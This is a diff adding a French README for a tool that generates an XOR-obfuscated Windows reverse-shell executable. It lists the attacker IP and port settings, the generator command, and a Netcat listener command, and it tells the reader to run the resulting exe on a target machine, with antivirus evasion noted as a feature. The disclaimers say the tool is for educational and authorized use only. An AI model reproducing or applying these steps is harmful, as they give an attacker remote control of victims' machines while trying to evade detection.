@@ -1,0 +1,45 @@
+Modifier la configuration (optionnel) :
+
+Ouvrez le script generate_reverse_shell.py et modifiez les variables suivantes si nécessaire :
+
+python
+Copy
+LHOST = "192.168.1.182"  # Votre adresse IP
+LPORT = 4545             # Port d'écoute
+XOR_KEY = "mcommon"      # Clé de chiffrement XOR
+Exécuter le script :
+
+bash
+Copy
+python3 generate_reverse_shell.py
+Résultat :
+
+Le script génère un fichier exécutable reverse_shell.exe
+
+Tous les fichiers temporaires sont supprimés automatiquement
+
+Tester :
+
+Sur votre machine, démarrez un écouteur Netcat :
+
+bash
+Copy
+nc -nvlp 4545
+Exécutez reverse_shell.exe sur la machine cible
+
+Structure du projet
+generate_reverse_shell.py : Script principal
+
+reverse_shell.cpp : Code C++ généré (temporaire)
+
+reverse_shell.exe : Exécutable final
+
+Sécurité
+À utiliser uniquement dans des environnements légaux et autorisés
+
+Le chiffrement XOR est basique et ne garantit pas une protection complète contre les antivirus
+
+Toujours obtenir une autorisation écrite avant de tester sur des systèmes tiers
+
+Avertissement
+Ce projet est fourni à des fins éducatives uniquement. L'auteur n'est pas responsable de toute utilisation illégale ou abusive de ce logiciel.
